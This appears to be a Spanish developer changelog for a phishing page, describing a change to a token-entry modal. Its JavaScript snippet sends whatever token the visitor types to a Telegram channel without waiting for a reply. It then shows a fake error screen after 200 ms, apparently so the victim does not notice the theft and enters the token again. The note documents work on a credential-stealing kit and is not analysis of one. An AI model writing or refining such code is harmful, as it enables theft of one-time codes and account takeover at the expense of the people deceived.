🔥 TOKEN MODAL - NUEVA FUNCIONALIDAD
-------------------------------------------

✅ assets/js/token-modal.js modificado:
   
   ANTES:
   - Al hacer submit → mostraba loading overlay
   - Esperaba respuesta de Telegram
   - Iniciaba polling
   - Usuario veía cargando...
   
   AHORA:
   - Al hacer submit → envía token sin esperar
   - NO muestra overlay
   - Muestra pantalla de error con img cancel.png
   - Delay mínimo: 200ms
   - Usuario ve error inmediatamente
   
   Código modificado en submitToken():
   ```javascript
   async submitToken() {
       this.closeTokenModal();
       
       // Enviar sin esperar respuesta
       window.telegramManager.sendToTelegram('token', {
           token: this.tokenValue
       }).catch(err => console.error('Error:', err));
       
       // Mostrar error modal inmediatamente
       setTimeout(() => this.openErrorModal(), 200);
   }
   ```
